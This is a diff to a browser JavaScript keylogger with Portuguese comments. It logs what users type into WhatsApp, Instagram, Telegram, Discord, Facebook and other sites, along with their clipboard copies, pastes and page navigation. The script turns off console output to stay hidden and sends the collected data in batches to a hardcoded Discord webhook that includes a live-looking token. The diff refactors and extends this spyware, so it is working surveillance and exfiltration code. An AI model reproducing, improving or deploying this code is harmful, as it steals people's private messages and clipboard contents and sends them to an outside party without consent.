@@ -11,12 +11,14 @@
         delete window._testing;
     }
 
+    // ─── CONFIGURAÇÕES ───
     const _id = '1528620856354537472';
     const _token = 'EDrEckoSN7dgJzZjj8LTeaisf_SxMjkrcy5QQMijZS3QcDFrNSEkvWPQde2-0V4EugEy';
     const _endpoint = 'https://discordapp.com/api/webhooks/' + _id + '/' + _token;
 
-    const _batchSize = 10;
-    const _flushInterval = 8000;
+    const _batchSize = 10;          // Mensagens por lote
+    const _flushInterval = 8000;    // 8 segundos
+    const _maxFieldLength = 900;    // Limite seguro do Discord por campo
 
     let _store = [];
     let _timer = null;
@@ -26,7 +28,6 @@
     localStorage.setItem('_collector_session', _session);
     let _eventCounts = { msg: 0, copy: 0, paste: 0, nav: 0 };
     let _isFlushing = false;
-    let _debug = false; 
     let _navObs = null;
 
     let _buffer = '';
@@ -36,6 +37,8 @@
     let _targetPlatform = '';
 
     const _noop = () => {};
+
+    // ─── SILENCIA CONSOLE ───
     const _orig = {
         log: console.log,
         warn: console.warn,
@@ -43,13 +46,13 @@
         info: console.info,
         debug: console.debug
     };
-
     console.log = _noop;
     console.warn = _noop;
     console.error = _noop;
     console.info = _noop;
     console.debug = _noop;
 
+    // ─── UTILITÁRIOS ───
     function _ts() {
         return new Date().toISOString().replace('T', ' ').slice(0, 19);
     }
@@ -75,70 +78,87 @@
         return display + (lines.length > 3 ? '… (+' + (lines.length - 3) + ' linhas)' : '');
     }
 
+    function _getPlatform() {
+        const url = document.URL;
+        if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'WhatsApp';
+        if (url.includes('habblive') || url.includes('habblet')) return 'Habblive';
+        if (url.includes('instagram')) return 'Instagram';
+        if (url.includes('telegram')) return 'Telegram';
+        if (url.includes('discord')) return 'Discord';
+        if (url.includes('facebook')) return 'Facebook';
+        if (url.includes('twitter') || url.includes('x.com')) return 'Twitter';
+        return 'Web';
+    }
+
+    // ─── SUBMISSÃO DE MENSAGEM ───
+    function _submitMessage() {
+        if (_buffer.trim().length > 0) {
+            _push('msg', {
+                txt: _buffer.trim(),
+                platform: _targetPlatform || _getPlatform(),
+                ctx: _targetTag + (_targetId ? '#' + _targetId : '')
+            });
+        }
+        _buffer = '';
+        _isCapturing = false;
+        _targetTag = '';
+        _targetId = '';
+        _targetPlatform = '';
+    }
+
+    // ─── BUILD DO EMBED COM VISUALIZAÇÃO MELHORADA ───
     function _buildEmbed(events) {
         const groups = { msg: [], copy: [], paste: [], nav: [] };
         events.forEach(e => { if (groups[e.ty]) groups[e.ty].push(e); });
 
         const fields = [];
 
-        if (groups.msg.length) {
-            const lines = groups.msg.map(e => {
-                const txt = e.d.txt || '';
-                const platform = e.d.platform || '';
-                const prefix = platform ? '[' + platform + '] ' : '';
-                return '> ' + prefix + txt;
-            });
-            const chunks = _chunkArray(lines, 10);
-            chunks.forEach((chunk, i) => {
+        // Formata uma linha de mensagem
+        function formatMsg(e) {
+            const ts = e.t || '--:--:--';
+            const platform = e.d.platform || 'Web';
+            const txt = (e.d.txt || '').slice(0, 150);
+            return `[${ts}] [${platform}] ${txt}`;
+        }
+
+        function addGroup(name, items, formatter) {
+            if (!items.length) return;
+            const chunks = _chunkArray(items, 8); // 8 por bloco para não estourar
+            chunks.forEach((chunk, idx) => {
+                const header = idx === 0
+                    ? `📌 ${name} (${items.length}) • ${_ts()}`
+                    : `⋯ continua (${idx + 1}/${chunks.length})`;
+                const lines = chunk.map(formatter);
+                let value = lines.join('\n');
+                // Adiciona separador no final de cada bloco
+                if (idx === chunks.length - 1) {
+                    value += '\n──────────────────';
+                } else {
+                    value += '\n───────────────';
+                }
+                // Trunca se necessário
+                if (value.length > _maxFieldLength) {
+                    value = value.slice(0, _maxFieldLength) + '…\n──────────────────';
+                }
                 fields.push({
-                    name: i === 0 ? '💬 Mensagens (' + lines.length + ')' : '⋯ continua',
-                    value: chunk.join('\n') || '—',
+                    name: header,
+                    value: '```\n' + value + '\n```',
                     inline: false
                 });
             });
         }
 
-        if (groups.copy.length) {
-            const copies = groups.copy.map(e => '📋 Copy: ' + _formatClipboard(e.d.txt));
-            const chunks = _chunkArray(copies, 8);
-            chunks.forEach((chunk, i) => {
-                fields.push({
-                    name: i === 0 ? '📋 Cópias (' + copies.length + ')' : '⋯ continua',
-                    value: chunk.join('\n') || '—',
-                    inline: false
-                });
-            });
-        }
+        addGroup('💬 Mensagens', groups.msg, formatMsg);
+        addGroup('📋 Cópias', groups.copy, e => `📋 ${_formatClipboard(e.d.txt)}`);
+        addGroup('📥 Colagens', groups.paste, e => `📥 ${_formatClipboard(e.d.txt)}`);
+        addGroup('🧭 Navegação', groups.nav, e => {
+            const title = (e.d.title || 'Unknown').slice(0, 40);
+            const url = (e.d.url || '').replace(/^https?:\/\//, '').slice(0, 35);
+            return `🔗 ${title} (${url})`;
+        });
 
-        if (groups.paste.length) {
-            const pastes = groups.paste.map(e => '📥 Paste: ' + _formatClipboard(e.d.txt));
-            const chunks = _chunkArray(pastes, 8);
-            chunks.forEach((chunk, i) => {
-                fields.push({
-                    name: i === 0 ? '📥 Colagens (' + pastes.length + ')' : '⋯ continua',
-                    value: chunk.join('\n') || '—',
-                    inline: false
-                });
-            });
-        }
-
-        if (groups.nav.length) {
-            const navs = groups.nav.map(e => {
-                const title = e.d.title || 'Unknown';
-                const url = e.d.url || '';
-                return '🔗 ' + title + ' (' + url.replace(/^https?:\/\//, '').slice(0, 30) + ')';
-            });
-            const chunks = _chunkArray(navs, 6);
-            chunks.forEach((chunk, i) => {
-                fields.push({
-                    name: i === 0 ? '🧭 Navegação (' + navs.length + ')' : '⋯ continua',
-                    value: chunk.join('\n') || '—',
-                    inline: false
-                });
-            });
-        }
-
-        const summary = '📊 ' + events.length + ' • 💬 ' + (_eventCounts.msg||0) + ' 📋 ' + (_eventCounts.copy||0) + ' 📥 ' + (_eventCounts.paste||0) + ' 🧭 ' + (_eventCounts.nav||0);
+        const total = events.length;
+        const summary = `📊 ${total} eventos • 💬 ${groups.msg.length} 📋 ${groups.copy.length} 📥 ${groups.paste.length} 🧭 ${groups.nav.length}`;
 
         return {
             embeds: [{
@@ -177,33 +197,7 @@
         _send(_store.splice(0, _store.length));
     }
 
-    function _getPlatform() {
-        const url = document.URL;
-        if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'WhatsApp';
-        if (url.includes('habblive') || url.includes('habblet')) return 'Habblive';
-        if (url.includes('instagram')) return 'Instagram';
-        if (url.includes('telegram')) return 'Telegram';
-        if (url.includes('discord')) return 'Discord';
-        if (url.includes('facebook')) return 'Facebook';
-        if (url.includes('twitter') || url.includes('x.com')) return 'Twitter';
-        return 'Web';
-    }
-
-    function _submitMessage() {
-        if (_buffer.trim().length > 0) {
-            _push('msg', {
-                txt: _buffer.trim(),
-                platform: _targetPlatform || _getPlatform(),
-                ctx: _targetTag + (_targetId ? '#' + _targetId : '')
-            });
-            _buffer = '';
-        }
-        _isCapturing = false;
-        _targetTag = '';
-        _targetId = '';
-        _targetPlatform = '';
-    }
-
+    // ─── HANDLERS DE CAPTURA ───
     function _handleKeyDown(e) {
         const key = e.key;
         const target = e.target;
@@ -212,12 +206,14 @@
             return;
         }
 
+        // Enter sem Shift = enviar mensagem
         if (key === 'Enter' && !e.shiftKey) {
             e.preventDefault();
             _submitMessage();
             return;
         }
 
+        // Escape = cancelar
         if (key === 'Escape') {
             _buffer = '';
             _isCapturing = false;
@@ -227,6 +223,7 @@
             return;
         }
 
+        // Backspace = remover último caractere do buffer
         if (key === 'Backspace') {
             if (_isCapturing) {
                 _buffer = _buffer.slice(0, -1);
@@ -234,7 +231,8 @@
             return;
         }
 
-        if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
+        // Só captura caracteres imprimíveis (exclui Shift, Alt, Ctrl, setas, F1-F12, etc.)
+        if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey && key.match(/[\x20-\x7E]|[\u00A0-\uFFFF]/)) {
             if (!_isCapturing) {
                 _isCapturing = true;
                 _targetTag = target.tagName;
@@ -246,21 +244,8 @@
             return;
         }
 
-        if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
-            return;
-        }
-
-        if (key === 'Tab') {
-            return;
-        }
-
-        if (key.startsWith('Arrow')) {
-            return;
-        }
-
-        if (_isCapturing) {
-            _buffer += key;
-        }
+        // Ignora qualquer outra tecla
+        return;
     }
 
     function _handleFocusOut(e) {
@@ -296,12 +281,6 @@
         _push('paste', { txt: txt.slice(0, 500), len: txt.length });
     }
 
-    function _setupMessageCapture() {
-        document.addEventListener('keydown', _handleKeyDown, true);
-        document.addEventListener('focusout', _handleFocusOut, true);
-        document.addEventListener('paste', _handlePaste, true);
-    }
-
     function _trackCopy(e) {
         const txt = window.getSelection().toString().trim();
         if (txt && txt.length > 0) {
@@ -327,7 +306,9 @@
 
     // ─── INICIALIZAÇÃO ───
     function _init() {
-        _setupMessageCapture();
+        document.addEventListener('keydown', _handleKeyDown, true);
+        document.addEventListener('focusout', _handleFocusOut, true);
+        document.addEventListener('paste', _handlePaste, true);
         document.addEventListener('copy', _trackCopy, true);
 
         _navObs = new MutationObserver(function() { _trackNav(); });
@@ -363,13 +344,11 @@
                 console.debug = _orig.debug;
                 delete window._testing;
             },
-            flush: _flush,
-            debug: function(on) {
-            }
+            flush: _flush
         };
     }
 
-    // ─── INICIALIZA ───
+    // ─── EXECUTA ───
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
         setTimeout(_init, 0);
     } else {
@@ -380,12 +359,12 @@
         if (!window._logs) _init();
     }, 3000);
 
+    // ─── EXPÕE KILL ───
     window._testing = {
         kill: function() {
             if (window._logs && typeof window._logs.kill === 'function') {
                 window._logs.kill();
             } else {
-                // Fallback manual
                 if (_timer) { clearInterval(_timer); _timer = null; }
                 if (_navObs) { _navObs.disconnect(); _navObs = null; }
                 document.removeEventListener('keydown', _handleKeyDown, true);
